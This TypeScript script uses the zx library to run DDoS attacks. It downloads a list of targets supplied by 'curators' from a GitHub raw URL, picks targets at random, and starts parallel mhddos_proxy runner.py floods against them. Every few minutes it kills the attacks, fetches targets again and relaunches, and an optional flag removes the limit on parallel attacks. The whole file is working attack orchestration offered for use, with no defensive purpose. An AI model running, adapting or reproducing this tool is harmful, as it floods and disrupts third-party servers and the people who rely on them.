import { $, argv, cd, chalk, fetch, nothrow, ProcessOutput, question, quiet } from 'zx';

$.verbose = false;

type Argv = typeof argv & {
  /**
   * Number of parallel attacks to run. Won't be less than 1 and more than the number of targets.
   * If 'all' is passed, all the targets will be attacked simultaneously.
   */
  parallel: number | 'all';

  /**
   * Disables the upper limit of {@link parallel} and allows any number of attacks on the same target.
   */
  'disable-parallel-limit': boolean;

  /**
   * Interval in seconds for stopping running attacks, re-fetching targets and starting new attacks.
   * Won't be less than 300 seconds (5 minutes).
   */
  'restart-interval': number;
};

type ShortArg = `-${string}=${string}`;
type LongArg = `--${string}=${string}`;

// ===== CONSTANTS

const SECOND = 1;
const MINUTE = SECOND * 60;

// ===== ARGUMENTS

const {
  _, // we don't need positional arguments
  c, // we don't need custom targets
  config, // we don't need custom targets
  parallel = 1,
  'disable-parallel-limit': disableParallelLimit = false,
  'restart-interval': restartInterval = MINUTE * 10,
  debug = true,
  t = 1000,
  ...mhddosArgs
} = argv as Argv;

if (disableParallelLimit) {
  console.log(
    chalk.redBright.bold(
      'WARNING: Disabling parallel limits can lead to unexpected results. Your system may become unresponsive or get damaged. Use at your own risk.',
    ),
  );

  const shouldContinue = (await question('Continue? (y/N) ')) === 'y';

  if (!shouldContinue) {
    console.log(chalk('Aborted.'));

    process.exit();
  }
}

const mhddosFlags = parseFlags(mhddosArgs);

// ===== RUN

// $`htop`;

await startAttack();

const intervalId = setInterval(async () => {
  await stopAttack();
  await startAttack();
}, Math.max(MINUTE * 5, restartInterval) * 1000);

// handling Ctrl+C
process.on('SIGINT', function () {
  clearInterval(intervalId);
  process.exit();
});

// ===== UTILS

async function startAttack(): Promise<void> {
  const targets = await getRandomTargets();
  const flags = [debug ? '--debug' : undefined, `-t=${Math.floor(t / targets.length)}`, ...mhddosFlags];

  if (targets.length) {
    console.log(chalk('\nStarting attacks...'));

    cd('/mhddos_proxy');

    {
      $.verbose = true;

      Promise.allSettled(
        targets.map(async (target) =>
          $`python3 runner.py ${target.split(' ')} ${flags.filter(Boolean)}`.catch((e: ProcessOutput) => {
            if (e.signal !== 'SIGTERM') {
              process.exit(e.exitCode ?? 1);
            }
          }),
        ),
      );

      $.verbose = false;
    }
  } else {
    console.log(chalk('There are currently no active targets. Waiting for updates from curators...'));
  }
}

async function stopAttack(): Promise<void> {
  await quiet(nothrow($`pkill -f runner.py`));

  console.log(chalk(`\nStopped attacks, updating targets.\n\n${'-'.repeat(50)}\n`));
}

async function getRandomTargets(): Promise<string[]> {
  const targets = await getTargetList();
  const parallel = computeParallel(targets);
  const randomTargets: string[] = [];

  while (randomTargets.length < parallel) {
    const randomTarget = targets[Math.floor(Math.random() * targets.length)];

    if (!randomTargets.includes(randomTarget) || randomTargets.length >= targets.length) {
      randomTargets.push(randomTarget);
    }
  }

  return randomTargets;
}

async function getTargetList(): Promise<string[]> {
  console.log(chalk('Getting targets...'));

  const response = await fetch('https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets');

  if (!response.ok) {
    console.log(chalk.redBright('Failed to get targets.'));

    return [];
  }

  const fileContent = await (response.ok ? response.text() : Promise.resolve(''));

  // show warning if there are active UDP targets
  if (/^(?=[^#]*udp:\/\/|\budp\b).+$/gim.test(fileContent)) {
    console.log(chalk.yellowBright('There are UDP targets that are not supported by this tool. They were ignored.'));
  }

  // getting all active non-UDP targets and clearing 'runner.py ' if present
  const targets =
    fileContent.match(/^((?!.*udp)([^#].)+?)$/gim)?.map((target) => target.replace('runner.py ', '')) || [];

  return [...new Set(targets)];
}

function parseFlags(args: Record<string, any>): Array<ShortArg | LongArg> {
  return Object.entries(args).map(([key, value]): ShortArg | LongArg => {
    return key.length === 1 ? `-${key}=${value}` : `--${key}=${value}`;
  });
}

function computeParallel(targets: string[]): number {
  if (parallel === 'all') {
    return targets.length;
  }

  return clamp({
    value: parallel,
    min: 1,
    max: disableParallelLimit ? parallel : targets.length,
  });
}

function clamp({ value, min, max }: { value: number; min: number; max: number }) {
  return Math.max(min, Math.min(value, max));
}
